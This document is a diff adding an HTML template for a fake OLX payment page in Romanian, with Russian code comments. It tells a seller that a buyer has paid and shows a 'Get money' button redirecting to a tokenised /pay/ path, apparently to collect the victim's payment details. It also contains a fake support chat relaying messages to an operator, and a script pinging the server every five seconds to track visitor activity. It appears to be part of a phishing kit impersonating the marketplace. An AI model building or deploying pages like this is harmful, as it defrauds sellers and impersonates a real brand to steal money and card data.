@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OLX Payment Page</title>
+    <style>
+        /* styles.css */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f5f5f5;
+    color: #333;
+    line-height: 1.5;
+    padding: 20px;
+}
+
+.container {
+    max-width: 600px;
+    margin: 0 auto;
+    background: #fff;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.header {
+    background-color: #005f59;
+    color: #fff;
+    text-align: center;
+    padding: 10px;
+    font-size: 1.5rem;
+    font-weight: bold;
+}
+
+.main-content {
+    padding: 20px;
+}
+
+.status {
+    background-color: #e9f7ef;
+    padding: 15px;
+    border-radius: 5px;
+    margin-bottom: 20px;
+    text-align: center;
+    color: #2c662d;
+}
+
+.product-info h1 {
+    font-size: 1.2rem;
+    margin-bottom: 10px;
+    font-weight: normal;
+}
+
+.price {
+    font-size: 1.5rem;
+    color: #005f59;
+    font-weight: bold;
+}
+
+.form-section {
+    margin: 20px 0;
+}
+
+.form-group {
+    margin-bottom: 15px;
+}
+
+.form-group label {
+    display: block;
+    font-weight: bold;
+    margin-bottom: 5px;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    background-color: #f9f9f9;
+    color: #666;
+}
+
+.delivery-options .option {
+    display: flex;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.delivery-options input {
+    margin-right: 10px;
+}
+
+.delivery-options label {
+    font-weight: bold;
+}
+
+.delivery-options span {
+    display: block;
+    font-size: 0.85rem;
+    color: #666;
+}
+
+.summary {
+    text-align: center;
+    margin-top: 20px;
+}
+
+.cta-button {
+    background-color: #005f59;
+    color: #fff;
+    border: none;
+    padding: 15px 20px;
+    border-radius: 5px;
+    font-size: 1rem;
+    cursor: pointer;
+    width: 100%;
+}
+
+.cta-button:hover {
+    background-color: #004e4a;
+}
+
+.secure-text {
+    margin-top: 15px;
+    font-size: 0.85rem;
+    color: #888;
+}
+
+.image_url {
+    margin: 0px 100px;
+    max-height: 350px;
+    max-width: 350px;
+    border-radius: 20px;
+}
+
+
+
+
+
+
+
+
+
+
+/* чат */
+/* Общие стили */
+#chat-button {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background-color: #000;
+        color: #fff;
+        border: none;
+        border-radius: 50px;
+        width: 60px;
+        height: 60px;
+        font-size: 24px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        z-index: 1001;
+    }
+    
+    #chat-container {
+        position: fixed;
+        bottom: 80px;
+        right: 20px;
+        width: 280px;
+        max-height: 500px;
+        min-height: 400px;
+        background-color: #fff;
+        border-radius: 10px;
+        box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
+        display: none; /* Чат скрыт по умолчанию */
+        flex-direction: column;
+        overflow: hidden;
+        z-index: 1000;
+    }
+    
+    #chat-container.active {
+        display: flex; /* Показать чат при активации */
+    }
+    
+    #chat-header {
+        display: flex;
+        align-items: center;
+        background-color: #000;
+        color: #fff;
+        padding: 10px;
+        border-top-left-radius: 10px;
+        border-top-right-radius: 10px;
+    }
+    
+    .chat-avatar img {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        margin-right: 10px;
+    }
+    
+    .chat-info h3 {
+        margin: 0;
+        font-size: 16px;
+    }
+    
+    .chat-info p {
+        margin: 0;
+        font-size: 12px;
+        opacity: 0.7;
+    }
+    
+    #close-chat {
+        background: none;
+        border: none;
+        color: #fff;
+        font-size: 18px;
+        margin-left: auto;
+        cursor: pointer;
+    }
+    
+    #chat-messages {
+        flex: 1;
+        padding: 10px;
+        background-color: #f9f9f9;
+        overflow-y: auto;
+    }
+    
+    .chat-message {
+        margin: 5px 0;
+        display: flex;
+        align-items: flex-start;
+    }
+    
+    .chat-message.user {
+        justify-content: flex-end;
+    }
+    
+    .chat-bubble {
+        max-width: 70%;
+        padding: 10px;
+        border-radius: 10px;
+        font-size: 14px;
+        line-height: 1.4;
+    }
+    
+    .chat-message.user .chat-bubble {
+        background-color: #000;
+        color: #fff;
+        border-bottom-right-radius: 0;
+    }
+    
+    .chat-message.bot .chat-bubble {
+        background-color: #e0e0e0;
+        color: #000;
+        border-bottom-left-radius: 0;
+    }
+    
+    #chat-input {
+        display: flex;
+        padding: 10px;
+        background-color: #fff;
+        border-top: 1px solid #ddd;
+    }
+    
+    #message-input {
+        flex: 1;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 20px;
+        outline: none;
+        font-size: 14px;
+    }
+    
+    #send-button {
+        background-color: #000;
+        color: #fff;
+        border: none;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        margin-left: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+    }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">OLX</div>
+        </header>
+        <main class="main-content">
+            <div class="status">
+                <p><strong>Cumpărătorul a plătit pentru produs</strong></p>
+                <p>Așteptați ca vânzătorul să primească banii</p>
+            </div>
+            <div class="product-info">
+                    <img src="{{image_url}}" alt="photo" class="image_url">
+                <h1>{{product_name}}</h1>
+                <p class="price">{{price}}</p>
+            </div>
+            <div class="form-section">
+                <div class="form-group">
+                    <label for="name">Nume & Nume de familie</label>
+                    <input type="text" id="name" value="{{name}}" readonly>
+                </div>
+                <div class="form-group">
+                    <label for="address">Adresă de livrare</label>
+                    <input type="text" id="address" value="{{address}}" readonly>
+                </div>
+                <div class="delivery-options">
+                    <div class="option">
+                        <input type="radio" id="olx-courier" name="delivery" checked>
+                        <label for="olx-courier">OLX Courier<br><span>Livrarea prin curier este posibilă</span></label>
+                    </div>
+                    <div class="option">
+                        <input type="radio" id="fan-courier" name="delivery">
+                        <label for="fan-courier">Fan Courier<br><span>Livrarea prin curier este posibilă</span></label>
+                    </div>
+                    <div class="option">
+                        <input type="radio" id="posta-romana" name="delivery">
+                        <label for="posta-romana">Poșta Română<br><span>Livrarea prin curier este posibilă</span></label>
+                    </div>
+                </div>
+            </div>
+            <div class="summary">
+                <p><strong>A merge la primirea de fonduri</strong></p>
+                <p>La primire: <span class="price">{{price}}</span></p>
+
+                <button id="Ricevi" class="cta-button">Obțineți bani</button>
+                
+                <script>
+                    // Добавляем обработчик клика к кнопке с ID "Ricevi"
+                    document.querySelector("#Ricevi").addEventListener("click", function() {
+                        // Получение текущего URL
+                        const currentUrl = window.location.href;
+                
+                        // Извлечение части URL после "/get/"
+                        const extractedPart = currentUrl.split("/get/")[1];
+                
+                        // Проверка, есть ли нужная часть в URL
+                        if (extractedPart) {
+                            // Перенаправление на "/pay/" с добавлением извлеченной части
+                            window.location.href = "/pay/" + extractedPart;
+                        } else {
+                            alert("Ошибка: в URL отсутствует часть после '/get/'.");
+                        }
+                    });
+                </script>
+
+
+                <p class="secure-text">
+                    <small>
+                        Efectuarea plăților este sigură<br>
+                        Dând clic pe butonul „Mergeți la primire”, sunteți de acord cu încheierea Acordului pentru vânzarea de bunuri folosind serviciul online „Tranzacție sigură”.
+                    </small>
+                </p>
+            </div>
+        </main>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <!-- ЧАТ НАЧ -->
+            <button id="chat-button">💬</button>
+            <div id="chat-container">
+                <div id="chat-header">
+                    <div class="chat-avatar">
+                        <img src="/media/operator-img.png" alt="Support">
+                    </div>
+                    <div class="chat-info">
+                        <h3>Supporto</h3>
+                        <p>Online</p>
+                    </div>
+                    <button id="close-chat">✖</button>
+                </div>
+                <div id="chat-messages"></div>
+                <div id="chat-input">
+                    <input type="text" id="message-input" placeholder="Digitare un messaggio...">
+                    <button id="send-button">➤</button>
+                </div>
+            </div>
+                
+            <script>
+                const chatButton = document.getElementById('chat-button');
+                const chatContainer = document.getElementById('chat-container');
+                const closeChat = document.getElementById('close-chat');
+                const sendButton = document.getElementById('send-button');
+                const messageInput = document.getElementById('message-input');
+                const chatMessages = document.getElementById('chat-messages');
+                
+                // Открытие/закрытие чата
+                chatButton.addEventListener('click', () => {
+                    chatContainer.classList.toggle('active');
+                });
+                
+                closeChat.addEventListener('click', () => {
+                    chatContainer.classList.remove('active');
+                });
+                
+        
+        
+                // Функция для извлечения токена из URL
+                function getTokenFromURL() {
+                    const url = window.location.pathname; // Получаем путь из URL
+                    const match = url.match(/\/get\/([^/]+)/); // Ищем токен после /get/
+                    return match ? match[1] : null; // Возвращаем токен или null, если токен не найден
+                }
+        
+        
+        
+        
+                // Функция для запроса сообщений от администратора
+                async function fetchAdminMessages(token) {
+                    try {
+                        const response = await fetch(`/get_admin_message_support/${token}/`, {
+                            method: 'GET',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            }
+                        });
+        
+                        if (response.ok) {
+                            const data = await response.json();
+                            const status = data.status
+                            if (status=="success") {
+                                const adminMessage = data.message || null;
+                                if (adminMessage) {
+                                    addMessage(adminMessage, 'bot'); // Добавляем сообщение от администратора
+                                }
+                            }
+                        } else {
+                            console.error('Ошибка при запросе сообщений администратора:', response.status);
+                        }
+                    } catch (error) {
+                        console.error('Ошибка при подключении:', error);
+                    }
+                }
+                
+                // Функция для отправки сообщений
+                async function sendMessage() {
+                    const userMessage = messageInput.value.trim();
+                    const token = getTokenFromURL(); // Получаем токен из URL
+        
+                    if (userMessage && token) {
+                        addMessage(userMessage, 'user'); // Отображаем сообщение от пользователя
+        
+                        // Формируем тело запроса
+                        const payload = {
+                            text: userMessage,
+                            token: token
+                        };
+        
+                        try {
+                            // Отправляем запрос на сервер
+                            const response = await fetch(`/send_message_support/${token}/`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(payload)
+                            });
+        
+                            if (response.ok) {
+                                messagePollingInterval = setInterval(() => {
+                                    fetchAdminMessages(token);
+                                }, 2000);
+        
+        
+        
+                            } else {
+                                addMessage('Ошибка сервера, попробуйте позже.', 'bot');
+                            }
+                        } catch (error) {
+                            console.error('Ошибка:', error);
+                            addMessage('Ошибка подключения, попробуйте позже.', 'bot');
+                        }
+        
+                        messageInput.value = ''; // Очищаем поле ввода
+                    } else if (!token) {
+                        alert('Токен не найден в URL!');
+                    }
+        }
+        
+                // Функция для добавления сообщения
+                function addMessage(text, sender) {
+                    const messageElement = document.createElement('div');
+                    messageElement.classList.add('chat-message', sender);
+                    const bubble = document.createElement('div');
+                    bubble.classList.add('chat-bubble');
+                    bubble.textContent = text;
+                    messageElement.appendChild(bubble);
+                    chatMessages.appendChild(messageElement);
+                    chatMessages.scrollTop = chatMessages.scrollHeight;
+                }
+        
+                // Привязка событий
+                sendButton.addEventListener('click', sendMessage); // Оставляем одну привязку
+                messageInput.addEventListener('keypress', (event) => {
+                    if (event.key === 'Enter') {
+                        sendMessage();
+                    }
+                });
+        
+        </script>
+    
+    
+    
+    
+    
+    
+    <script>
+        const currentUrl = window.location.href;
+        const token = currentUrl.split("/get/")[1];
+    
+        // Функция для уведомления сервера
+        async function notifyServer() {
+        try {
+            const response = await fetch(`/check_activity/${token}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+            });
+            if (response.ok) {
+            console.log("Пользователь активен");
+            } else {
+            console.log("Ошибка сервера при проверке активности");
+            }
+        } catch (error) {
+            console.error("Ошибка при отправке запроса:", error);
+        }
+        }
+    
+        // Устанавливаем интервал уведомлений
+        setInterval(notifyServer, 5000); // Отправляем запрос каждые 5 секунд
+    </script>
+            
+        
+            <!-- ЧАТ КОН -->
+</body>
+</html>
